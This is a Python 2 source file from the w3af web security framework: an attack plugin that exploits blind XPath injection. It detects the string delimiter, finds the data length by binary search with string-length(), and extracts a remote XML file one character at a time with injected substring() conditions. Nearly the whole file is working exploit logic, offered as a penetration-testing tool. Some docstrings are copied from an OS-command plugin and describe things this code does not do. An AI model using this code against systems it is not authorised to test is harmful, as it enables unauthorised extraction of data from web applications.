'''
xpath.py

Copyright 2012 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from random import randint
import re
import difflib

from core.data.kb.knowledgeBase import kb
from core.data.parsers.urlParser import url_object

from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
from core.controllers.w3afException import w3afException
import core.controllers.outputManager as om
from core.data.kb.exec_shell import shell as shell

ERROR_MSG = 'Empty Path Expression'
XML_FILTER = '//*'
THRESHOLD = 0.8


class xpath(baseAttackPlugin):

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured parameter
        self._change_to_post = True
        self._url = ''
        self._data = ''
        self._inj_var = ''
        self._method = 'GET'
    
        # Internal variables
        self.use_difflib = None        
        self.rnum = randint(1,100)

    def fastExploit( self ):
        '''
        Exploits a web app with os_commanding vuln, the settings are configured using setOptions()
        '''
        raise w3afException('Not implemented.')
    
    def getOptions(self):
        #TODO: Implement this
        return []
    
    def setOptions(self, options):
        #TODO: Implement this
        pass
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'

    def getRootProbability(self):
        return 0.0
    
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
        
        Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
        return 'os_commanding' in this method.
        '''        
        return 'xpath'
                
    def _generateShell(self, vuln):
        '''
        @param vuln: The vulnerability to exploit
        
        @return: A shell object that allows the user to dump
        the full XML using an xpath injection vulnerability.
        '''        
        #
        #    Check if the vulnerability can be exploited using our techniques
        #
        if self._verifyVuln( vuln ):
            #
            #    Generate the shell
            #
            if vuln.getMethod() != 'POST' and self._change_to_post and \
            self._verifyVuln( self.GET2POST( vuln ) ):
                msg = 'The vulnerability was found using method GET, but POST is being used'
                msg += ' during this exploit.'
                om.out.console( msg )
                vuln = self.GET2POST( vuln )
            else:
                msg = 'The vulnerability was found using method GET, tried to change the method to'
                msg += ' POST for exploiting but failed.'
                om.out.console( msg )
            
            # Create the shell object
            shell_obj = xpath_reader( vuln )
            shell_obj.set_url_opener( self._uri_opener )
            shell_obj.STR_DEL = self.STR_DEL
            shell_obj.TRUE_COND = self.TRUE_COND
            shell_obj.FALSE_COND = self.FALSE_COND
            shell_obj.use_difflib = self.use_difflib  
            return shell_obj
            
        else:
            # FAIL!
            return None
            
    def _verifyVuln(self, vuln):
        '''
        @return: True if the vulnerability can be exploited.
        '''
        #    Check if I should difflib or not during this exploit
        self.use_difflib = self._verifyDifflib(vuln, 10)
        
        #
        #    Create the TRUE and FALSE conditions for the queries using
        #    the correct string delimiter
        #
        delimiter = self._get_delimiter( vuln )
        if delimiter is None:
            return False
        
        self.STR_DEL = delimiter
        orig_value = vuln.getMutant().getOriginalValue()
        
        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
                                                   self.rnum, self.STR_DEL, 
                                                   self.STR_DEL, self.rnum)
        
        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
                                                    self.rnum, self.STR_DEL, 
                                                    self.STR_DEL, self.rnum + 1)
        
        exploit_dc = vuln.getDc()
        functionReference = getattr( self._uri_opener , vuln.getMethod() )
        exploit_dc[ vuln.getVar() ] = self.FALSE_COND

        #
        #    Testing False response
        #
        om.out.debug( "Testing FALSE response..." )
        try:
            false_resp = functionReference( vuln.getURL(), str(exploit_dc) )
        except w3afException, e:
            return 'Error "' + str(e) + '"'
        else:
            if not response_is_error(vuln, false_resp.getBody(), self._uri_opener, self.use_difflib):  
                om.out.debug( "ERROR: Error message not found in FALSE response..." )
                return False
            else:
                om.out.debug( "Error message found in FALSE response GOOD!" )
            #
            #    Now that we know that the FALSE response was correct, test the
            #    TRUE response.
            #
            om.out.debug( "Testing TRUE response..." )
            exploit_dc[ vuln.getVar() ] = self.TRUE_COND

            try:
                true_resp = functionReference( vuln.getURL(), str(exploit_dc) )
            except w3afException, e:
                om.out.debug( 'Error "%s"' % (e) )
                return None
            else:              
                if response_is_error(vuln, true_resp.getBody(), self._uri_opener, self.use_difflib):
                    print true_resp.getBody()
                    om.out.debug( "ERROR: Error message found in TRUE response..." )
                    return False
                else:
                    om.out.debug( "Error message not found in TRUE response GOOD!" )
                    return True
            
    def _get_delimiter(self, vuln):
        '''
        @return: The delimiter to be used to terminate strings, one of
        single quote or double quote. If an error is found, None is returned.
        '''
        exploit_dc = vuln.getDc()
        orig_value = vuln.getMutant().getOriginalValue()
        functionReference = getattr( self._uri_opener , vuln.getMethod() )
        
        true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
        false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1) 
        true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum) 
        
        om.out.debug( "Trying to determine string delimiter" )
        om.out.debug( "Testing single quote... (')" )
        exploit_dc[ vuln.getVar() ] = true_sq
        try:
            sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
        except w3afException, e:
            om.out.debug( 'Error "%s"' % (e) )
            return None
        else:
            if response_is_error(vuln, sq_resp.getBody(), self._uri_opener, self.use_difflib):
                # If we found ERROR with TRUE Query, we have a problem!
                om.out.debug( 'Single quote TRUE test failed, testing double quote' )
                exploit_dc[ vuln.getVar() ] = true_dq
                try:
                    dq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                except w3afException, e:
                    om.out.debug( 'Error "%s"' % (e) )
                    return None
                else:
                    if response_is_error(vuln, dq_resp.getBody(), self._uri_opener, self.use_difflib):
                        # If we found an error HERE, the TWO tests were ERROR, 
                        # Houston we have a BIG PROBLEM! 
                        om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
                        return None
                    else:
                        om.out.debug( 'String delimiter found! It is (")!' )
                        return '"'
            else:
                # If true query was single-quote, test false query.
                exploit_dc[ vuln.getVar() ] = false_sq
                try:
                    sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                except w3afException, e:
                    om.out.debug( 'Error "%s"' % (e) )
                    return None
                else:
                    if response_is_error(vuln, sq_resp.getBody(), self._uri_opener, self.use_difflib):
                        om.out.debug( 'String delimiter FOUND, it is (\')!' )
                        return "'"
                    else:
                        om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
                        return None         
                     


    def _verifyDifflib(self, vuln, count):
        '''
        This function determines if we can use DiffLib to evaluate responses
        If not possible Error base detection will be used.
        
        @return: TRUE if we can use DiffLib and FALSE if not.
        '''
        diffRatio = 0.0
        
        exploit_dc = vuln.getDc()
        functionReference = getattr( self._uri_opener , vuln.getMethod() )
        exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()

        om.out.debug( "Testing if body dynamically changes... " )
        try:
            base_res = functionReference( vuln.getURL(), str(exploit_dc) )
            
            for _ in xrange(count):
                req_x = functionReference( vuln.getURL(), str(exploit_dc) )
                diffRatio += difflib.SequenceMatcher(None, base_res.getBody(), 
                                                    req_x.getBody()).ratio()
                                                                         
        except w3afException, e:
            om.out.debug( 'Error "%s"' % (e) )
        else:
            om.out.debug( 'Test finished!' )
            
            if (diffRatio / count) > THRESHOLD:
                om.out.debug( 'It is possible use difflib for identifying the error response' )
                return True
            else:
                om.out.debug( 'Randomness is too high to use difflib, switching to error based detection...' )
                return False

    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits XPATH injections. The exploit result is the full
        text dump (without tags) of the remote XML file.

        No options are available at this moment since the plugin is in beta phase.
        '''
    
class xpath_reader(shell):

    def __init__(self, v):
        shell.__init__(self, v)
        
        self._rOS = 'XML'
        self._rSystem = 'XPATH Query'
        self._rUser = None
        self._rSystemName = None
        self.id = 0
        
        # TODO: Review this HARD-CODED constant
        self.max_data_len = 10000
    
    def __repr__(self):
        return '<'+self.getName()+' object)>'
    
    __str__ = __repr__

    def help( self, command ):
        '''
        Handle the help command.
        '''
        result = []
        result.append('Available commands:')
        result.append('    help                            Display this information')
        result.append('    getxml                          Get the full XML file')        
        result.append('    exit                            Exit the shell session')
        result.append('')
        return '\n'.join(result)
 
    def specific_user_input( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        # Get the command and the parameters
        splist = command.split(' ')
        command = splist[0]
        
        if command.strip() == 'getxml':
            return self.getxml()
        
    def getxml(self):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        data_len = self._get_data_len()
        if data_len is not None:
            
            try:
                data = self.get_data(data_len)
            except w3afException:
                om.out.debug( 'Error found during data extraction: "%s"' % w3afException )
                return ''
            else:
                return data

    def _get_data_len(self):
        '''
        @return: The length of the data to retrieve or self.max_data_len if the
        XML is too long. In the case of an error, None is returned.
        '''
        exploit_dc = self.getDc()
        functionReference = getattr( self._uri_opener , self.getMethod() )

        maxl = self.max_data_len
        minl = 1
        
        om.out.debug("Finding XML data length...")
        
        fdata_len = False
        while not fdata_len:
            
            mid = (maxl + minl) / 2
            om.out.debug( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )

            orig_value = self.getMutant().getMutant().getOriginalValue()
            skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')

            findlen = "%s%s and string-length(%s)=%i %s" % (orig_value,
                                                           self.STR_DEL,
                                                           XML_FILTER, 
                                                           mid, self.TRUE_COND[skip_len:])
            exploit_dc[ self.getVar() ] = findlen
            
            try:    
                lresp = functionReference( self.getURL(), str(exploit_dc) )
            except w3afException, e:
                om.out.debug( 'Error "%s"' % (e) )
            else:
                if response_is_error(self, lresp.getBody(), self._uri_opener, self.use_difflib):
                    # We found the length!
                    fdata_len = True
                    om.out.debug('Response Length FOUND!: %i ' % (mid) )
                    return mid
                
                else:

                    findlen = "%s%s and string-length(%s)<%i %s" % (orig_value,
                                                                   self.STR_DEL,
                                                                   XML_FILTER, 
                                                                   mid , self.TRUE_COND[skip_len:])
                    try:
                        exploit_dc[ self.getVar() ] = findlen
                        lresp = functionReference( self.getURL(), str(exploit_dc) )
                    except w3afException, e:
                        om.out.debug( 'Error "' + str(e) + '"')
                        return None
                    else:
                        if not response_is_error(self, lresp.getBody(), 
                                                 self._uri_opener,
                                                 self.use_difflib):
                            # LENGTH IS < THAN MID
                            maxl = mid
                        else:
                            # LENGTH IS > THAN MID
                            minl = mid

    def get_data(self, ldata):
        '''
        @param ldata: The data length to retrieve
        @return: A string with the XML data!
        
        HTTP library exceptions are not handled in order to make the code clearer. 
        '''
        exploit_dc = self.getDc()
        functionReference = getattr( self._uri_opener , self.getMethod() )

        data = ''
        
        for pos in range(ldata):
            for c in range(32,127):

                orig_value = self.getMutant().getMutant().getOriginalValue()
                skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
                
                hexcar = chr(c)
                dataq = '%s%s and substring(%s,%i,1)="%s" %s' % (orig_value,
                                                                 self.STR_DEL,
                                                                 XML_FILTER, 
                                                                 pos, hexcar, 
                                                                 self.TRUE_COND[skip_len:])
                exploit_dc[ self.getVar() ] = dataq
                dresp = functionReference( self.getURL(), str(exploit_dc) )
                
                if not response_is_error(self, dresp.getBody(), self._uri_opener, self.use_difflib):
                    om.out.console('Character found: "%s"' % hexcar )
                    data += hexcar
                    break
            else:
                om.out.console('Character NOT found!')
                    
        return data
            
    def end( self ):
        om.out.debug('xpath_reader cleanup complete.')
        
    def getName( self ):
        return 'xpath_reader'
        

#
#    Helper functions
#
def response_is_error(vuln_obj, res_body, url_opener, use_difflib=True):
    '''
    This functions checks which method must be used to check Responses
    
    @return: True if the res_body is ERROR and FALSE if Not
    '''
    if use_difflib:
        
        exploit_dc = vuln_obj.getDc()
        functionReference = getattr( url_opener , vuln_obj.getMethod() )

        exploit_dc[ vuln_obj.getVar() ] = vuln_obj.getMutant().getOriginalValue()

        # TODO: Perform this request only once
        base_res = functionReference( vuln_obj.getURL(), str(exploit_dc) )
        if difflib.SequenceMatcher(None, base_res.getBody(), 
                                   res_body).ratio() < THRESHOLD :
            return True
        else:
            return False

    else:
        
        if re.search(ERROR_MSG, res_body, re.IGNORECASE):
            return True
        else:
            return False
